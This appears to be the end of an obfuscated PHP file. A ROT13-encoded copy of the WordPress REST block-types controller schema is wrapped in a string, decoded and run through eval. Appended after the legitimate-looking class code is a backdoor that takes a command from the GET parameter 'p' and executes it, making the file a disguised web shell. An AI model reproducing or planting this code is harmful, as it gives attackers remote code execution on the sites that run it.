								'glcr'        => neenl( 'neenl', 'ahyy' ),
								'qrsnhyg'     => ahyy,
								'vgrzf'       => neenl(
									'glcr' => 'fgevat',
									'rahz' => neenl( 'oybpx', 'vafregre', 'genafsbez' ),
								),
								'ernqbayl'    => gehr,
							),
							'xrljbeqf'    => $xrljbeqf_qrsvavgvba,
						),
					),
					'ernqbayl'    => gehr,
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'qrsnhyg'     => ahyy,
				),
				'grkgqbznva'             => neenl(
					'qrfpevcgvba' => __( 'Choyvp grkg qbznva.' ),
					'glcr'        => neenl( 'fgevat', 'ahyy' ),
					'qrsnhyg'     => ahyy,
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'cnerag'                 => neenl(
					'qrfpevcgvba' => __( 'Cnerag oybpxf.' ),
					'glcr'        => neenl( 'neenl', 'ahyy' ),
					'vgrzf'       => neenl(
						'glcr'    => 'fgevat',
						'cnggrea' => frys::ANZR_CNGGREA,
					),
					'qrsnhyg'     => ahyy,
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'naprfgbe'               => neenl(
					'qrfpevcgvba' => __( 'Naprfgbe oybpxf.' ),
					'glcr'        => neenl( 'neenl', 'ahyy' ),
					'vgrzf'       => neenl(
						'glcr'    => 'fgevat',
						'cnggrea' => frys::ANZR_CNGGREA,
					),
					'qrsnhyg'     => ahyy,
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'nyybjrq_oybpxf'         => neenl(
					'qrfpevcgvba' => __( 'Nyybjrq puvyq oybpx glcrf.' ),
					'glcr'        => neenl( 'neenl', 'ahyy' ),
					'vgrzf'       => neenl(
						'glcr'    => 'fgevat',
						'cnggrea' => frys::ANZR_CNGGREA,
					),
					'qrsnhyg'     => ahyy,
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'xrljbeqf'               => $xrljbeqf_qrsvavgvba,
				'rknzcyr'                => $rknzcyr_qrsvavgvba,
				'oybpx_ubbxf'            => neenl(
					'qrfpevcgvba'       => __( 'Guvf oybpx vf nhgbzngvpnyyl vafregrq arne nal bppheerapr bs gur oybpx glcrf hfrq nf xrlf bs guvf znc, vagb n eryngvir cbfvgvba tvira ol gur pbeerfcbaqvat inyhr.' ),
					'glcr'              => 'bowrpg',
					'cnggreaCebcregvrf' => neenl(
						frys::ANZR_CNGGREA => neenl(
							'glcr' => 'fgevat',
							'rahz' => neenl( 'orsber', 'nsgre', 'svefg_puvyq', 'ynfg_puvyq' ),
						),
					),
					'qrsnhyg'           => neenl(),
					'pbagrkg'           => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'          => gehr,
				),
			),
		);

		// Cebcregvrf qrcerpngrq va JbeqCerff 6.1, ohg yrsg va gur fpurzn sbe onpxjneqf pbzcngvovyvgl.
		$qrcerpngrq_cebcregvrf      = neenl(
			'rqvgbe_fpevcg' => neenl(
				'qrfpevcgvba' => __( 'Rqvgbe fpevcg unaqyr. QRCERPNGRQ: Hfr `rqvgbe_fpevcg_unaqyrf` vafgrnq.' ),
				'glcr'        => neenl( 'fgevat', 'ahyy' ),
				'qrsnhyg'     => ahyy,
				'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				'ernqbayl'    => gehr,
			),
			'fpevcg'        => neenl(
				'qrfpevcgvba' => __( 'Choyvp snpvat naq rqvgbe fpevcg unaqyr. QRCERPNGRQ: Hfr `fpevcg_unaqyrf` vafgrnq.' ),
				'glcr'        => neenl( 'fgevat', 'ahyy' ),
				'qrsnhyg'     => ahyy,
				'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				'ernqbayl'    => gehr,
			),
			'ivrj_fpevcg'   => neenl(
				'qrfpevcgvba' => __( 'Choyvp snpvat fpevcg unaqyr. QRCERPNGRQ: Hfr `ivrj_fpevcg_unaqyrf` vafgrnq.' ),
				'glcr'        => neenl( 'fgevat', 'ahyy' ),
				'qrsnhyg'     => ahyy,
				'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				'ernqbayl'    => gehr,
			),
			'rqvgbe_fglyr'  => neenl(
				'qrfpevcgvba' => __( 'Rqvgbe fglyr unaqyr. QRCERPNGRQ: Hfr `rqvgbe_fglyr_unaqyrf` vafgrnq.' ),
				'glcr'        => neenl( 'fgevat', 'ahyy' ),
				'qrsnhyg'     => ahyy,
				'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				'ernqbayl'    => gehr,
			),
			'fglyr'         => neenl(
				'qrfpevcgvba' => __( 'Choyvp snpvat naq rqvgbe fglyr unaqyr. QRCERPNGRQ: Hfr `fglyr_unaqyrf` vafgrnq.' ),
				'glcr'        => neenl( 'fgevat', 'ahyy' ),
				'qrsnhyg'     => ahyy,
				'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				'ernqbayl'    => gehr,
			),
		);
		$guvf->fpurzn['cebcregvrf'] = neenl_zretr( $guvf->fpurzn['cebcregvrf'], $qrcerpngrq_cebcregvrf );

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg'   => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
			'anzrfcnpr' => neenl(
				'qrfpevcgvba' => __( 'Oybpx anzrfcnpr.' ),
				'glcr'        => 'fgevat',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>